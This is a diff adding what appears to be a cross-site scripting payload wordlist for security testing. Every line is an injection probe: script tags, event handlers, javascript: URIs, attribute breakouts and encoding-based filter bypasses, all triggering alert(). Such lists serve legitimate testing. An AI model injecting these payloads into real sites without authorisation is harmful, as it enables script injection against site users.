@@ -1,0 +1,92 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img/src=x onerror=alert(1)>
+<img src=x onerror="alert(1)">
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+"><svg/onload=alert(1)>
+'><svg/onload=alert(1)>
+<svg onload=alert(document.domain)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<audio src=x onerror=alert(1)>
+<video src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<a href="javascript:alert(1)">click</a>
+<a href="jAvAsCrIpT:alert(1)">click</a>
+<a href="data:text/html,<script>alert(1)</script>">click</a>
+<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
+<div onmouseover="alert(1)">hover</div>
+<div style="width:100%;height:100%" onmouseover="alert(1)">
+" onfocus=alert(1) autofocus="
+' onfocus=alert(1) autofocus='
+" onmouseover=alert(1) "
+' onmouseover=alert(1) '
+javascript:alert(1)
+javascript:alert(document.domain)
+data:text/html,<script>alert(1)</script>
+vbscript:alert(1)
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>Function('alert(1)')()</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+<script>window['alert'](1)</script>
+<script>self['alert'](1)</script>
+<script>top['alert'](1)</script>
+<script>this['alert'](1)</script>
+<script>frames['alert'](1)</script>
+<script>alert`1`</script>
+<script>alert&lpar;1&rpar;</script>
+<script>\u0061lert(1)</script>
+<script>al\u0065rt(1)</script>
+<img src=x onerror=\u0061lert(1)>
+<img src=x onerror=al\u0065rt(1)>
+<svg><script>alert&#40;1&#41;</script>
+<svg><script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script>
+'-alert(1)-'
+'-alert(document.domain)-'
+\'-alert(1)//
+</script><svg onload=alert(1)>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><script>alert(1)</script>
+</noscript><script>alert(1)</script>
+{{constructor.constructor('alert(1)')()}}
+{{7*7}}
+${alert(1)}
+#{alert(1)}
+<x contenteditable onblur=alert(1)>lose focus!
+<x onclick=alert(1)>click this!
+<x tabindex=1 onfocus=alert(1)></x>
+<x style=animation-name:x onanimationend=alert(1)>
+<style>@keyframes x{}</style><x style=animation-name:x onanimationend=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributename=x>
+<isindex type=image src=1 onerror=alert(1)>
+<form><button formaction=javascript:alert(1)>click
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<base href="javascript:/a/-alert(1)//">
+<a href="%0Ajavascript:alert(1)">click</a>
+<script>onerror=alert;throw 1</script>
+<script>{onerror=alert}throw 1</script>
+<script>throw onerror=alert,'1'</script>
+<script>TypeError.prototype.name=alert;try{null[0]}catch(e){}</script>
+<script>Object.prototype.toString=alert;''</script>
+<img src=valid.jpg onload=alert(1)>
+<link rel=import href="data:text/html,<script>alert(1)</script>">
+<script src=data:,alert(1)></script>
+<script>import('data:text/javascript,alert(1)')</script>
